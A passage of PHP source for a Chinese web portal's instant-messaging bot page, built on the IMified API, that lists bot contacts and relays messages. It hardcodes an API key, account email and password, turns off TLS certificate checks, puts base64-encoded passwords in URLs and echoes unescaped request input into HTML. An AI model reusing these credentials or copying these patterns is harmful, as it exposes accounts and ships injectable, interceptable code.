                        &nbsp验证码：<input <?php  $style->textarea("#FCFC9D",""); ?> maxlength="4" name="checkcode" id="checkcode" class="text" type="text" size="7">&nbsp;<a href="javascript:changeimg()" title="看不清楚？换一个！"><IMG id="ccimg" height="14.5" src="<?php echo ScriptPath();?>?api=checkcode" border="0"></a>
                        &nbsp<input type="submit" class="button" name="docinSubmit" value=" Go ">
                </td>
        </tr>   
</table>
<?php 
                break;
}       

$style->footer();
exit;
}
?>

<?php 
function imified() {
header('Content-Type: text/html; charset=gb2312');
$imifiedsmsid = "";
$sCrLf = chr(13) . chr(10); // 回车 + 换行
$imifiedapikey = 'EEB8B13F-60E8-4C5A-9DFC854AC18FF5A5';
$imifieduser = 'xcy6272003@126.com';
$imifiedpwd = 'EUIfgwe7';

switch (trim(request('action'))) { //action switch start
        case 'bot':
                if(trim(request("apikey")) == $imifiedapikey){
                        $imifiedu = $imifieduser;
                        $imifiedp = $imifiedpwd;
                        $botkey = $imifiedapikey;       
                }
                else{
                        $imifiedu = trim(request("uname"));
                        $imifiedp = trim(request("pwd"));
                        $botkey = trim(request("apikey"));      
                }
                if($botkey == '' || $imifiedu == '' || $imifiedp == ''){
                        echo iconv("gb2312","utf-8","API网址设置有误！<reset>").$sCrLf;
                }
                switch (trim(request('step'))) {
                case 1:
                        echo iconv("gb2312","utf-8","X3193 即时通信机器人").$sCrLf;
                        echo iconv("gb2312","utf-8","1：发送信息 2：生活服务 3：网内消息").$sCrLf;
                        break;
                case 2:
                        if (trim(request('value1')) !=''){
                                if (strtolower(trim(request('value1'))) == 'exit' || strtolower(trim(request('value1'))) == 'quit'){
                                        echo '<goto=1>';                        
                                }
                                else{
                                        if (trim(request('value1')) == '1'){
                                                echo iconv("gb2312","utf-8","请回复IM帐号！").$sCrLf;
                                        }
                                        else{
                                                echo iconv("gb2312","utf-8",'选项错误，请重新选择！<goto=1>');                  
                                        }       
                                }       
                        }
                        else{
                                echo iconv("gb2312","utf-8",'系统错误，请重新输入！<error>');
                        }                       
                        break;
                case 3:
                        if (trim(request('value1')) !='' && trim(request('value2')) !=''){
                                if (strtolower(trim(request('value2'))) == 'exit' || strtolower(trim(request('value2'))) == 'quit'){
                                        echo '<goto=1>';
                                }
                                else{
                                        if (trim(request('value1')) == '1'){
                                                echo iconv("gb2312","utf-8","请回复网络名称：").$sCrLf;
                                                echo iconv("gb2312","utf-8","AIM/Jabber/Yahoo/MSN/Gtalk/SMS/Email").$sCrLf;
                                        }
                                        else{
                                                echo iconv("gb2312","utf-8",'选项错误，请重新选择！<goto=1>');                  
                                        }                                               
                                }       
                        }
                        else{
                                echo iconv("gb2312","utf-8",'系统错误，请重新输入！<error>');
                        }       
                        break;
                case 4:
                        if (trim(request('value1')) !='' && trim(request('value2')) !='' && trim(request('value3')) !=''){
                                if (strtolower(trim(request('value3'))) == 'exit' || strtolower(trim(request('value3'))) == 'quit'){
                                        echo '<goto=1>';
                                }
                                else{
                                        if (trim(request('value1')) == '1'){
                                                if(strtolower(trim(request('value3'))) == 'aim' || strtolower(trim(request('value3'))) == 'jabber' || strtolower(trim(request('value3'))) == 'msn' || strtolower(trim(request('value3'))) == 'sms' || strtolower(trim(request('value3'))) == 'yahoo' || strtolower(trim(request('value3'))) == 'gtalk'){
                                                        echo iconv("gb2312","utf-8","请回复信息内容！").$sCrLf;
                                                }
                                                else{
                                                        echo iconv("gb2312","utf-8",'网络选择错误，请重新选择！<error>');                       
                                                }       
                                        }
                                        else{
                                                echo iconv("gb2312","utf-8",'选项错误，请重新选择！<goto=1>');                  
                                        }                                               
                                }       
                        }
                        else{
                                echo iconv("gb2312","utf-8",'系统错误，请重新输入！<error>');
                        }       
                        break;
                case 5:
                        if (trim(request('value2')) != "" && trim(request('value1')) !='' && trim(request('value3')) !='' && trim(request('value4')) !=''){
                                if (strtolower(trim(request('value4'))) == 'exit' || strtolower(trim(request('value4'))) == 'quit'){
                                        echo '<goto=1>';                        
                                        break;          
                                }       
                                if (trim(request('value1')) == '1'){
                                        $contactstr = strtolower(trim(request('value2')));
                                        $contactnetworkstr = strtolower(trim(request('value3')));
                                        if (($_SERVER['SERVER_NAME'] == "localhost") || ($_SERVER['SERVER_NAME'] == "127.0.0.1")){
                                                $xmlstr = '<rsp stat="ok">'.
                                                                '<users count="3"><user><status></status><extendedstatus></extendedstatus><userkey>8C338311-3075-4073-82CEA566F138998C</userkey><screenname>msn.bot.im</screenname><user>msn.bot.im</user><network>Jabber</network><created>{ts \'2010-02-11 15:46:17\'}</created><lastcall>{ts \'2010-06-07 04:36:03\'}</lastcall><lastonline></lastonline></user><user><status></status><extendedstatus></extendedstatus><userkey>C08884D8-940A-4561-ABB21857F2AFCAD0</userkey><screenname>wanw.x3193.3322.org@gmail.com</screenname><user>wanw.x3193.3322.org@gmail.com</user><network>Jabber</network><created>{ts \'2010-05-03 07:17:45\'}</created><lastcall>{ts \'2010-06-05 08:27:57\'}</lastcall><lastonline></lastonline></user><user><status></status><extendedstatus></extendedstatus><userkey>6485AAF9-3DF3-4947-ACABB277DA26531E</userkey><screenname>x3193.cz.cc@gmail.com</screenname><user>x3193.cz.cc@gmail.com</user><network>Jabber</network><created>{ts \'2010-06-05 06:24:42\'}</created><lastcall>{ts \'2010-06-05 12:08:07\'}</lastcall><lastonline></lastonline></user></users>'.
                                                                '</rsp>';
                                        }       
                                        else{   
                                                $ch = curl_init();
                                                $url = "https://www.imified.com/api/bot/";
                                                $data = array(
                                                        'botkey' => $botkey,
                                                        'apimethod' => 'getallusers'
                                                );
                                                $ch = curl_init();
                                                curl_setopt($ch, CURLOPT_URL, $url);
                                                curl_setopt($ch, CURLOPT_USERPWD, $imifiedu.':'.$imifiedp);
                                                curl_setopt($ch, CURLOPT_HEADER, 0);
                                                curl_setopt($ch, CURLOPT_POST, 1);
                                                curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
                                                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                                                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);    
                                                curl_setopt($ch, CURLOPT_TIMEOUT, 50);
                                                $xmlstr = curl_exec($ch);
                                                curl_close($ch);
                                        }
                                        $objXml = new DOMDocument();  
                                        $objXml->preserveWhiteSpace = true;
                                        $objXml->async = false; 
                                        $objXml->loadXML($xmlstr);
                                        if (!$objXml->getElementsByTagName("rsp")->item(0)->attributes->item(0)->nodeValue){
                                                echo iconv("gb2312","utf-8","系统接口发生意外错误，请稍后重试");
                                        }       
                                        elseif ($objXml->getElementsByTagName("rsp")->item(0)->attributes->item(0)->nodeValue != 'ok'){
                                                echo $objXml->getElementsByTagName("err")->item(0)->attributes->item(0)->nodeValue;
                                        }
                                        elseif ($objXml->getElementsByTagName("rsp")->item(0)->attributes->item(0)->nodeValue == 'ok'){ // getallusers succes start
                                                $objList = $objXml->getElementsByTagName("users")->item(0)->getElementsByTagName("user");
                                                $sendflag = 0;
                                                for ($i = 0;$i < $objList->length;$i=$i+2){ // for send start
                                                        $objHdd = $objList->item($i);
                                                        $imid = $objHdd->getElementsByTagName('userkey')->item(0)->nodeValue;
                                                        $imuser = $objHdd->getElementsByTagName('user')->item(0)->nodeValue;
                                                        $imnetwork = $objHdd->getElementsByTagName('network')->item(0)->nodeValue;
                                                        if (strtolower($objHdd->getElementsByTagName('user')->item(0)->nodeValue) !== strtolower(trim(request('user'))) || strtolower($objHdd->getElementsByTagName('network')->item(0)->nodeValue) !== strtolower(trim(request('network')))){
                                                        }
                                                        elseif (strtolower($objHdd->getElementsByTagName('user')->item(0)->nodeValue) === strtolower(trim(request('user'))) && strtolower($objHdd->getElementsByTagName('network')->item(0)->nodeValue) === strtolower(trim(request('network')))){ // find contact to send start
                                                                $imreuser = $imuser;
                                                                $imrenetwork = $imnetwork;
                                                                break;  
                                                        }  // find contact to send start
                                                }                                               
                                                for ($i = 0;$i < $objList->length;$i=$i+2){ // for send start
                                                        $objHdd = $objList->item($i);
                                                        $imid = $objHdd->getElementsByTagName('userkey')->item(0)->nodeValue;
                                                        $imuser = $objHdd->getElementsByTagName('user')->item(0)->nodeValue;
                                                        $imnetwork = $objHdd->getElementsByTagName('network')->item(0)->nodeValue;
                                                        if (strtolower($objHdd->getElementsByTagName('user')->item(0)->nodeValue) !== strtolower($contactstr) || strtolower($objHdd->getElementsByTagName('network')->item(0)->nodeValue) !== strtolower($contactnetworkstr)){
                                                        }
                                                        elseif (strtolower($objHdd->getElementsByTagName('user')->item(0)->nodeValue) === strtolower($contactstr) && strtolower($objHdd->getElementsByTagName('network')->item(0)->nodeValue) === strtolower($contactnetworkstr)){ // find contact to send start
                                                                if (($_SERVER['SERVER_NAME'] == "localhost") || ($_SERVER['SERVER_NAME'] == "127.0.0.1")){
                                                                        $xmlstr = '<rsp stat="ok">'.
                                                                                        '<users count="3"><user><status></status><extendedstatus></extendedstatus><userkey>8C338311-3075-4073-82CEA566F138998C</userkey><screenname>msn.bot.im</screenname><user>msn.bot.im</user><network>Jabber</network><created>{ts \'2010-02-11 15:46:17\'}</created><lastcall>{ts \'2010-06-07 04:36:03\'}</lastcall><lastonline></lastonline></user><user><status></status><extendedstatus></extendedstatus><userkey>C08884D8-940A-4561-ABB21857F2AFCAD0</userkey><screenname>wanw.x3193.3322.org@gmail.com</screenname><user>wanw.x3193.3322.org@gmail.com</user><network>Jabber</network><created>{ts \'2010-05-03 07:17:45\'}</created><lastcall>{ts \'2010-06-05 08:27:57\'}</lastcall><lastonline></lastonline></user><user><status></status><extendedstatus></extendedstatus><userkey>6485AAF9-3DF3-4947-ACABB277DA26531E</userkey><screenname>x3193.cz.cc@gmail.com</screenname><user>x3193.cz.cc@gmail.com</user><network>Jabber</network><created>{ts \'2010-06-05 06:24:42\'}</created><lastcall>{ts \'2010-06-05 12:08:07\'}</lastcall><lastonline></lastonline></user></users>'.
                                                                                        '</rsp>';
                                                                }       
                                                                else{   
                                                                        $ch = curl_init();
                                                                        $url = "https://www.imified.com/api/bot/";
                                                                        $data = array(
                                                                                'botkey' => $botkey,
                                                                                'apimethod' => 'send',
                                                                                'userkey' => $objHdd->getElementsByTagName('userkey')->item(0)->nodeValue, 
                                                                                'msg' => iconv('gb2312','utf-8','<'.$imreuser.'-'.$imrenetwork.'> '.trim(request('value4')).$sCrLf)
                                                                        );
                                                                        curl_setopt($ch, CURLOPT_URL, $url);
                                                                        curl_setopt($ch, CURLOPT_HEADER, 0);
                                                                        curl_setopt($ch, CURLOPT_USERPWD, $imifiedu.':'.$imifiedp);
                                                                        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
                                                                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                                                        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                                                                        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);    
                                                                        curl_setopt($ch, CURLOPT_TIMEOUT, 150);
                                                                        $contactxmlstr = curl_exec($ch);
                                                                        curl_close($ch);
                                                                }
                                                                $IMobjXml = new DOMDocument();  
                                                                $IMobjXml->preserveWhiteSpace = true;
                                                                $IMobjXml->async = false; 
                                                                $IMobjXml->loadXML($contactxmlstr);                                     
                                                                if (!$IMobjXml->getElementsByTagName("rsp")->item(0)->attributes->item(0)->nodeValue){
                                                                        echo iconv("gb2312","utf-8","系统接口发生意外错误，请稍后重试");
                                                                        $sendflag = 2;
                                                                }
                                                                elseif ($IMobjXml->getElementsByTagName("rsp")->item(0)->attributes->item(0)->nodeValue != 'ok'){
                                                                        echo $objXml->getElementsByTagName("err")->item(0)->attributes->item(0)->nodeValue;
                                                                        $sendflag = 2;
                                                                }
                                                                elseif ($IMobjXml->getElementsByTagName("rsp")->item(0)->attributes->item(0)->nodeValue == 'ok'){       
                                                                        echo iconv("gb2312","utf-8",'信息发送成功');
                                                                        $sendflag = 1;
                                                                }
                                                                break;  
                                                        }  // find contact to send start
                                                }  // for send end
                                                if ($sendflag == '0'){
                                                        echo iconv('gb2312','utf-8','该帐号未加入此IM机器人');          
                                                        echo '<reset>'; 
                                                }               
                                                elseif ($sendflag == '2'){
                                                        echo '<error>';         
                                                }       
                                                else{
                                                        echo '<reset>'; 
                                                }       
                                        } // getallusers success end
                                        break;  
                                }
                                else{
                                        echo iconv("gb2312","utf-8",'选项错误，请重新选择！<goto=1>');                  
                                }               
                        }
                        else{
                                echo iconv("gb2312","utf-8",'系统发生意外错误，请重试！');
                                echo '<reset>';
                        }                       
                        break;
                default :
                        echo '<reset>';
                        break;
                }
                break;
        default:
                session_start();

?>
<head>
                <?php 
                $style = new css();
                $style->ico();
                $style->title("X3193 - 消息");
                $skincolor = selstyle(trim(request("skin")));
                $sCrLf = chr(13) . chr(10); // 回车 + 换行                
                ?>

<table width="100%" height="100%" align="center" valign="center">
        <tr>
                <td align="center" valign="middle">
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr>
                <td align="left" style="border:0">
                <?php  selskin(); ?>
                </td>
                <td align="right" style="border:0">             
                        <?php  
                         IF(!is_wap())
                        	sellink("主页|插件|搜索|地球|域名|相册|网址|FTP|读书|邮箱|游戏|邮件|短片|股票|VPN",$skincolor);
                        else
                        	sellink("主页|搜索|域名|相册|网址|FTP|邮箱|邮件|短片",$skincolor);
                        ?>
                </td>
        </tr>           
</table>
                <?php 
                $imifiedu = trim(request("uname"));
                $imifiedp = trim(request("pwd"));

                // 每页条数
                if (trim(request('pagesize')) == "")
                        $pagesize = 30;
                elseif (trim(request('pagesize')) > 50)
                        $pagesize = 50;
                else
                        $pagesize = trim(request('pagesize'));

                $stract = trim(request("action"));
                
                if (trim(request("page")) != "" && is_numeric(trim(request("page"))) !== false){
                        $page = floor(trim(request("page")));
                }       
                else{
                        $page = floor("1");
                }

                if(trim(request("botkey")) == ''){
                        $imifiedu = $imifieduser;
                        $imifiedp = $imifiedpwd;
                        $botkey = $imifiedapikey;       
                }
                else{
                        $imifiedu = trim(request("uname"));
                        $imifiedp = trim(request("pwd"));
                        $botkey = trim(request("botkey"));      
                }
        
                $tag = New TagAction(); 
                
                switch (trim(request('action'))) { //action switch start
                        case 'getallusers':
                                if (trim(request("logout")) != ""){
                                        session_start();
if(substr(PHP_VERSION, 0, 3)=='5.4'){
		//session_register("X3193");
}
elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
                                        session_register("imified");
}                                         

                                        $_SESSION["imified"]=array('uname' => '', 'pwd' => '', 'botkey' => '');                                 
                                        //session_register("uname"); 
                                        //$_SESSION["uname"] = "";      
                                        //session_register("pwd"); 
                                        //$_SESSION["pwd"] = "";        
                                        redirect(scriptpath()."?api=imified&skin=".$skincolor."&uname=&pwd=&botkey=&action=".encodeuri(trim(request("action")))."&urlflag=1&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u"))));
                                        break;
                                }
                                elseif (trim($_POST["uname"]) != "" && trim($_POST["pwd"]) != ""){
                                        If ($_SESSION['ValidCode'] != "" && $_SESSION['ValidCode'] != trim(request("checkcode"))){
                                                if (trim(request("checkcode")) != ""){
                                                        AlertBack("四位验证码错误！" , 1);
                                                        break;
                                                }       
                                                elseif (trim(request("checkcode")) == ""){
                                                        AlertBack("四位验证码为空！" , 1);
                                                        break;
                                                }               
                                        }

                                        session_start();
if(substr(PHP_VERSION, 0, 3)=='5.4'){
		//session_register("X3193");
}
elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
                                        session_register("imified");
} 
                                        $_SESSION["imified"]=array('uname' => trim(request("uname")), 'pwd' => trim(request("pwd")), 'botkey' => trim(request("botkey")));                                      
                                        //session_register("uname"); 
                                        //$_SESSION["uname"] = trim(request("uname"));  
                                        //session_register("pwd"); 
                                        //$_SESSION["pwd"] = trim(request("pwd"));      
                                        //session_register("botkey"); 
                                        
                                        //$botkey = trim(request("botkey"));
                                        //$_SESSION["botkey"] = $botkey;        
                                        
                                        redirect(scriptpath()."?api=imified&skin=".$skincolor."&uname=".encodeuri(base64_encode(trim($_POST["uname"])))."&pwd=".encodeuri(base64_encode(trim($_POST["pwd"])))."&botkey=".encodeuri(trim($botkey))."&action=".trim(request("action"))."&checkcode=".trim(request("checkcode"))."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u"))));
                                        break;
                                }
                                elseif ($_SESSION["imified"]["uname"] != "" && $_SESSION["imified"]["pwd"] != "" && trim(request("uname")) == "" && trim(request("pwd")) == ""){
                                        redirect(scriptpath()."?api=imified&skin=".$skincolor."&uname=".encodeuri(base64_encode(trim($_SESSION["imified"]["uname"])))."&pwd=".encodeuri(base64_encode(trim($_SESSION["imified"]["pwd"])))."&botkey=".encodeuri(trim($_SESSION["imified"]["botkey"]))."&action=".trim(request("action"))."&checkcode=".trim(request("checkcode"))."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u"))));
                                        break;
                                }       
                                elseif (trim(request("uname")) == "" || trim(request("pwd")) == ""){
                                        redirect(scriptpath()."?api=imified&skin=".$skincolor."&uname=&pwd=&botkey=&action=&checkcode=".trim(request("checkcode"))."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u"))));
                                        break;
                                }
                                
                                if (($_SERVER['SERVER_NAME'] == "localhost") || ($_SERVER['SERVER_NAME'] == "127.0.0.1")){
                                        $xmlstr = '<rsp stat="ok">'.
                                                        '<users count="3"><user><status></status><extendedstatus></extendedstatus><userkey>8C338311-3075-4073-82CEA566F138998C</userkey><screenname>msn.bot.im</screenname><user>msn.bot.im</user><network>Jabber</network><created>{ts \'2010-02-11 15:46:17\'}</created><lastcall>{ts \'2010-06-07 04:36:03\'}</lastcall><lastonline></lastonline></user><user><status></status><extendedstatus></extendedstatus><userkey>C08884D8-940A-4561-ABB21857F2AFCAD0</userkey><screenname>wanw.x3193.3322.org@gmail.com</screenname><user>wanw.x3193.3322.org@gmail.com</user><network>Jabber</network><created>{ts \'2010-05-03 07:17:45\'}</created><lastcall>{ts \'2010-06-05 08:27:57\'}</lastcall><lastonline></lastonline></user><user><status></status><extendedstatus></extendedstatus><userkey>6485AAF9-3DF3-4947-ACABB277DA26531E</userkey><screenname>x3193.cz.cc@gmail.com</screenname><user>x3193.cz.cc@gmail.com</user><network>Jabber</network><created>{ts \'2010-06-05 06:24:42\'}</created><lastcall>{ts \'2010-06-05 12:08:07\'}</lastcall><lastonline></lastonline></user></users>'.
                                                        '</rsp>';
                                }       
                                else{   
                                        $ch = curl_init();
                                        $url = "https://www.imified.com/api/bot/";
                                        $data = array(
                                                'botkey' => $botkey,
                                                'apimethod' => 'getallusers'
                                        );
                                        $ch = curl_init();
                                        curl_setopt($ch, CURLOPT_URL, $url);
                                        curl_setopt($ch, CURLOPT_USERPWD, base64_decode(trim(request("uname"))).':'.base64_decode(trim(request("pwd"))));
                                        curl_setopt($ch, CURLOPT_HEADER, 0);
                                        curl_setopt($ch, CURLOPT_POST, 1);
                                        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
                                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                                        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);    
                                        curl_setopt($ch, CURLOPT_TIMEOUT, 50);
                                        $xmlstr = curl_exec($ch);
                                        curl_close($ch);
                                }       
                                $objXml = new DOMDocument();  
                                $objXml->preserveWhiteSpace = true;
                                $objXml->async = false; 
                                $objXml->loadXML($xmlstr);                              
                                
                                if (!$objXml->getElementsByTagName("rsp")->item(0)->attributes->item(0)->nodeValue){
                                ?>
<table width="90%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 查 询 结 果 </td>
        </tr>
        <tr class="tdbg">
                <td align="center" id="result">
                <?php  AlertBack ("系统接口发生意外错误，请稍后重试！" ,2)?>
                </td>
        </tr>   
</table>                        
                                <?php 
                                }
                                elseif ($objXml->getElementsByTagName("rsp")->item(0)->attributes->item(0)->nodeValue != 'ok'){
                                        AlertBack ($objXml->getElementsByTagName("err")->item(0)->attributes->item(0)->nodeValue , 2);
                                }
                                elseif ($objXml->getElementsByTagName("rsp")->item(0)->attributes->item(0)->nodeValue == 'ok'){ 
                                        $objList = $objXml->getElementsByTagName("users")->item(0)->getElementsByTagName("user");
                                        if ($objList->length > floor($pagesize))
                                                $strpagesize = $pagesize; 
                                        else{ 
                                                $strpagesize = $objList->length;
                                                $skipflag = "";
                                        }       
                                        $imcount = "0";
                                        for ($i = 0;$i < $objList->length;$i=$i+2){
                                                $skipflag = "";
                                                $objHdd = $objList->item($i);
                                                $imid = $objHdd->getElementsByTagName('userkey')->item(0)->nodeValue;
                                                $imuser = $objHdd->getElementsByTagName('user')->item(0)->nodeValue;
                                                $imnetwork = $objHdd->getElementsByTagName('network')->item(0)->nodeValue;
                                                if (trim(request("imnetwork")) != "" && $imnetwork != trim(request("imnetwork"))){
                                                        $skipflag = "yes";
                                                        break;
                                                }       
                                                $imstatus = $objHdd->getElementsByTagName('status')->item(0)->nodeValue;
                                                if (trim(request("imstatus")) != "" && $imstatus != trim(request("imstatus"))){
                                                        $skipflag = "yes";
                                                        break;
                                                }
                                                $imcreate = $objHdd->getElementsByTagName('created')->item(0)->nodeValue;
                                                if ($skipflag == ""){
                                                        $imcount = $imcount + 1;
                                                }
                                        }               
                                        $totalitem = $imcount;
                                        ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center" colspan="3"> 查 询 结 果 : 共 <?php echo $imcount?> 条 </td>
        </tr>
</table>
<table width="95%" align="center" cellspacing="0" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="left" colspan="3" width="100%">&nbsp; [ <a style="color:#000000" href="<?php echo ScriptPath()."?api=imified&pagesize=".encodeuri($pagesize)."&page=".encodeuri("1")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&botkey=".encodeuri(trim($botkey))."&skin=".$skincolor."&action=".encodeuri("getallusers")."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))?>" target=_self>好友</a> <?php  if (trim(request("imnetwork")) != "") {echo " - <a style=\"color:#000000\" href=\"".ScriptPath()."?api=imified&action=".encodeuri(trim(request("action")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&botkey=".encodeuri(trim($botkey))."&pagesize=".trim(request("pagesize"))."&page=".$page."&skin=".$skincolor."&imnetwork=".trim(request("imnetwork"))."\">".trim(request("imnetwork"))."</a>";}?> <?php  if (trim($_SESSION["imified"]["uname"]) != "" && trim($_SESSION["imified"]["pwd"]) != "") {?><input type="button"  - <a style="color:#000000;"href="<?php echo scriptpath()."?api=imified&skin=".$skincolor."&uname=".encodeuri(Base64_encode(trim(request("uname"))))."&pwd=".encodeuri(Base64_encode(trim(request("pwd"))))."&botkey=".encodeuri(trim($botkey))."&action=".encodeuri(trim(request("action")))."&urlflag=1&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&logout=1"?>" target="_self">退出</a>><?php  } ?> ] </td>
        </tr>
</table>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
<form name="dnspod" method="post" action="">
                                        <?php 
                                        $totalitem = $objList->length/2;
                                        if (fmod($totalitem, $pagesize) == 0){
                                                $totalpage=$totalitem/$pagesize;
                                        }       
                                        else{
                                                $totalpage=ceil($totalitem/$pagesize);
                                        }
                                        if ($totalpage == $page)
                                                $endid = $totalitem-1;
                                        elseif ($totalpage > $page)
                                                $endid = floor($strpagesize*($page)-1);
                                        elseif ($totalpage < $page){
                                                $endid = floor($strpagesize*($page-1)-1);
                                        }
                                        ?>
        <tr class="tdbg">
                <td align="center" width=15%>
                        名称
                </td>
                <td align="center" width=15%>
                        密钥
                </td>
                <td align="center" width=15%>
                        状态
                </td>
                <td align="center" width=15%>
                        上次呼叫
                </td>
                <td align="center" width=20%>
                        加入时间
                </td>
                <td align="center" width=20%>
                                        <?php 
                                        ?>
                </td> 
        </tr>   
                                        <?php 
                                        $skipflag = "";
                                        $imcount = "0";
                                        for ($i = $strpagesize*($page-1)*2;$i<=$endid*2;$i=$i+2){
                                                $skipflag = "";
                                                $objHdd = $objList->item($i);
                                                $imid = $objHdd->getElementsByTagName('userkey')->item(0)->nodeValue;
                                                $imuser = $objHdd->getElementsByTagName('user')->item(0)->nodeValue;
                                                $imnetwork = $objHdd->getElementsByTagName('network')->item(0)->nodeValue;
                                                if (trim(request("imnetwork")) != "" && $imnetwork != trim(request("imnetwork"))){
                                                        $skipflag = "yes";
                                                }       
                                                else{
                                                        $imcount = $imcount + 1;                                
                                                }       
                                                $lastcall = $objHdd->getElementsByTagName('lastcall')->item(0)->nodeValue;
                                                $imcreate = $objHdd->getElementsByTagName('created')->item(0)->nodeValue;
                                                if ($skipflag == ""){
                                                ?>
        <tr class="tdbg">
                <td align="center">
                                                <?php 
                                                echo "<a style=\"color:#000000\" href=\"".ScriptPath()."?api=imified&action=".encodeuri("getuser")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&botkey=".encodeuri(trim($botkey))."&pagesize=".trim(request("pagesize"))."&page=".$page."&skin=".$skincolor."&imid=".$imid."\">".$imuser."</a>";
                                                ?>
                </td>
                <td align="center">
                                                <?php 
                                                echo $imid;
                                                ?>
                </td>
                <td align="center">
                                                <?php 
                                                echo "<a style=\"color:#000000\" href=\"".ScriptPath()."?api=imified&action=".encodeuri(trim(request("action")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&botkey=".encodeuri(trim($botkey))."&skin=".$skincolor."&imnetwork=".$imnetwork."\">".$imnetwork."</a>";
                                                ?>
                </td>
                <td align="center">
                                                <?php 
                                                echo $lastcall;
                                                ?>
                </td>
                <td align="center">
                                                <?php 
                                                echo $imcreate;
                                                ?>
                </td>
                <td align="center">
                        <a style="color:#000000" href="<?php echo ScriptPath()."?api=picasa&action=".encodeuri("album.edit")."&authclientlogin=".encodeuri(trim(request("authclientlogin")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&botkey=".encodeuri(trim(request("botkey")))."&pagesize=".trim(request("pagesize"))."&page=".$page."&skin=".$skincolor."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING'])."&albumid=".encodeuri($albumid);?>">编辑</a> <?php  echo "<a style='color:#000000' href='".ScriptPath()."?api=imified&action=".encodeuri("sendmessage")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&botkey=".encodeuri(trim($botkey))."&editmodel=code&skin=".$skincolor."&imid=".$imid."&imuser=".$imuser."&imnetwork=".$imnetwork."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING'])."'>发信</a>";?>
                </td>
        </tr>   
                                                <?php 
                                                }                                       
                                        }
                                        ?>
                </td>
        </tr>   
</table>        
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdbg">
                <td align="center" colspan="3"> 共 <?php  echo $totalpage;?> 页 第  
                <?php 
                echo $page." 页 ".$sCrLf;
                if (floor($page)>1)
                        echo "<a style='color:#000000' href='".ScriptPath()."?api=imified&action=".encodeuri(trim(request("action")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&botkey=".encodeuri(trim($botkey))."&pagesize=".$pagesize."&page=".($page-1)."&skin=".$skincolor."&imnetwork=".trim(request("imnetwork"))."&imstatus=".trim(request("imstatus"))."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."'>上一页</a> ";
                if (floor($page)>0 && floor($page)<floor($totalpage))
                        echo "<a style='color:#000000' href='".ScriptPath()."?api=imified&action=".encodeuri(trim(request("action")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&botkey=".encodeuri(trim($botkey))."&pagesize=".$pagesize."&page=".($page+1)."&skin=".$skincolor."&imnetwork=".trim(request("imnetwork"))."&imstatus=".trim(request("imstatus"))."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."'>下一页</a> ";

                $gotopage = New PageChange();
                $gotopage->CallPageChange();
                ?>
                </td>
        </tr>   
</table>
                                        <?php 
                                        $gotopage->gotopage($totalpage,ScriptPath()."?api=imified&action=".trim(request("action"))."&uname=".encodeuri(trim(request("uname")))."&botkey=".encodeuri(trim($botkey))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".encodeuri($pagesize)."&skin=".$skincolor."&gopage=ok&imnetwork=".trim(request("imnetwork"))."&imstatus=".trim(request("imstatus"))."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&page=","X3193","请在空白处输入要转到的页数");
                                }
                                else{
                                }
                                break;  
                        case 'sendmessage': 

                                if (trim(request("uname")) == "" || trim(request("pwd")) == "" || trim(request("botkey")) == ""){
